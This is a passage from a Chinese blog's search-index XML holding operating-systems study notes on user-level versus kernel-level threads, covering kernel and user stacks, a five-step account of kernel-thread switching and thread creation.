<li>用户级线程对于操作系统内核来说是<strong>透明</strong>的，也就是TCB等数据结构无法被操作系统获取，当然也就没办法切换。</li>
</ol>
<hr>
<blockquote>
<p>核心级线程的特点：一套栈</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660358021040.png"></p>
<p>要清楚<strong>两个概念</strong>：</p>
<ul>
<li>每一个核心级线程都有对应的<strong>内核栈</strong>，线程的切换也是基于<strong>内核栈的切换</strong>；</li>
<li>切换后执行的代码仍是<strong>用户态</strong>，也就是要用到<strong>用户栈</strong>。</li>
</ul>
<hr>
<blockquote>
<p>用户栈和内核栈的管联</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660358160296.png"></p>
<p>二者通过<strong>中断和返回</strong>可以进行切换，具体流程下面介绍。</p>
<hr>
<blockquote>
<p>用户级线程、进程、内核级线程三者之间的关联与区别</p>
</blockquote>
<ol>
<li>引入进程的目标是为了<strong>管理CPU</strong>，所以三者都是<strong>执行一个指令序列</strong>，无本质区别。</li>
<li>要执行一个指令序列，处理要<strong>分配栈和存储数据结构</strong>外，还要<strong>分配资源</strong></li>
<li>进程必须在<strong>操作系统内核中创建</strong>，因为进程创建要涉及到计算机硬件资源的分配。所以，<code>进程中的执行序列就是一个内核级线程</code>。</li>
</ol>
<h2 id="内核级线程的切换"><a href="#内核级线程的切换" class="headerlink" title="内核级线程的切换"></a>内核级线程的切换</h2><blockquote>
<p>我们以<strong>一个例子</strong>来看内核级线程的切换<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660358374052.png"></p>
</blockquote>
<p>如图所示，当用户程序进行系统调用后，会实现<strong>用户栈到内核栈的切换</strong>，即将用户<strong>栈信息</strong>和<strong>用户程序信息</strong>压栈保存，而后执行内核代码。</p>
<p>当内核级程序阻塞后就会进行线程的切换，如下图所示：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660358590893.png"></p>
<p>通过<code>switch_it()</code>函数实现内核级线程的切换。其本质是完成<strong>内核栈的切换</strong>。</p>
<p>我们需要理清上图中一些<strong>问号的含义</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660358818204.png"></p>
<p>最重要的部分是“<code>？？？？</code>”表示一段可以<strong>完成返回的代码</strong>。通过其可以从<strong>内核栈返回用户栈</strong>，并<strong>执行用户态代码</strong>。</p>
<hr>
<blockquote>
<p>内核级线程切换<strong>五段论</strong>：</p>
</blockquote>
<p>前面我们介绍用户级线程切换时主要涉及到<strong>三个部分</strong>：<code>TCB切换</code>、<code>栈切换</code>、<code>PC指针切换</code>。</p>
<p>内核级进程切换也是<strong>依照上三个部分</strong>，只是在具体的实现方面<strong>更加复杂</strong>，可以扩展为<code>5个步骤</code>：</p>
<ol>
<li><code>中断进入</code>。在<strong>int指令或者其他硬件中断</strong>的中断程序入口，需要记录当前程序在用户态的<strong>执行信息</strong>，包括当前使用的用户栈、程序的执行位置、状态信息等，都要压入内核栈中。</li>
<li><code>调用schedule</code>。当执行中断处理程序时<strong>发生阻塞</strong>，就会调用<code>schedule</code>切换TCB。<strong>具体步骤</strong>：先将现TCB状态改为阻塞，而后选取一个新的TCB，使用next指针指向此TCB。</li>
<li><code>内核栈的切换</code>。将当前ESP寄存器中的数据放到现TCB中，而后将next指向的TCB中的EIP信息放到寄存器中。<strong>这个步骤与用户态线程切换一致</strong>。</li>
<li><code>中断返回</code>。这个步骤是为下一步的<strong>用户栈切换</strong>做准备，主要是将内核栈中存储的用户态程序的<strong>执行现场恢复</strong>，也就是我们在中断进入时压入的状态信息返回。</li>
<li><code>用户态切换</code>。使用内核栈信息，将<code>CS:EIP</code>和<code>SS:ESP</code>寄存器信息与用户态程序和用户栈对应即可。</li>
</ol>
<p><strong>具体的流程</strong>可见下图：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660360496511.png"></p>
<h2 id="内核级线程的建立"><a href="#内核级线程的建立" class="headerlink" title="内核级线程的建立"></a>内核级线程的建立</h2><p>在进行线程切换之前要先进行<strong>线程的创建</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660360527710.png"><br>如图所示，主要涉及到：<strong>栈空间的申请和参数的初始化、TCB空间的申请和关联等工作</strong>，保证可以实现第一次切换后的正常执行。</p>
<blockquote>
<p>用户级线程和核心级线程的对比：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660360663757.png"></p>
<h1 id="内核级线程实现"><a href="#内核级线程实现" class="headerlink" title="内核级线程实现"></a>内核级线程实现</h1>]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
</search>
